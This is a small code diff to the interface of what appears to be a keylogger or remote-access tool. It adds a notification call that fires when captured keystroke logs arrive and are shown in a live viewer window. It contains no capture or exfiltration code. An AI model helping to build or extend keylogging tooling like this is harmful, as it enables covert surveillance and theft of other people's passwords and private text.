@@ -73,6 +73,7 @@ public partial class KeyloggerWindow : Window
             UpdateBadge();
             if (!string.IsNullOrEmpty(data.Logs))
             {
+                NotificationService.NotifyKeylogReceived();
                 TxtLog.AppendText(data.Logs);
                 TxtLog.ScrollToEnd();
                 TxtViewerTitle.Text = $"Live buffer — {_capturing}";
